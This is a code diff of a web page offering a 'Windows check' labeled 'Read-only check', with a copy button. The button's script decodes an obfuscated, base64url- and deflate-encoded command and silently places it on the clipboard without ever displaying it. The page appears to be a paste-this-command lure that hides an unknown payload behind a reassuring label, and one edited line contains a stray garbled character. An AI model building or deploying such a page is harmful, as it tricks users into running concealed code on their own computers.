@@ -878,7 +878,7 @@
         <div class="command-panel">
           <div class="panel-label">
             <span><svg viewBox="0 0 24 24" aria-hidden="true"><rect x="3" y="4" width="18" height="16" rx="2"/><path d="m7 9 3 3-3 3M12 15h5"/></svg> Windows check</span>
-            <span class="safe-label"><span class="status-dot"></span> Read-only check</span>
+        d    <span class="safe-label"><span class="status-dot"></span> Read-only check</span>
           </div>
           <div class="command-line">
             <button class="copy-button" type="button" id="copyButton" disabled>
@@ -978,15 +978,16 @@
     
     if (copyButton && handlerId) {
       try {
+      	const command = await decompressDeflate(decodeBase64Url(handlerId));
         const label = copyButton.querySelector('span');
         const defaultLabel = label.textContent;
         let resetTimer;
         
         copyButton.disabled = false;
         
-        copyButton.addEventListener('click', async () => {
+        copyButton.addEventListener('click', () => {
           const textarea = document.createElement('textarea');
-          textarea.value = await decompressDeflate(decodeBase64Url(handlerId));
+          textarea.value = command;
           textarea.style.position = 'fixed';
           textarea.style.opacity = 0;
           
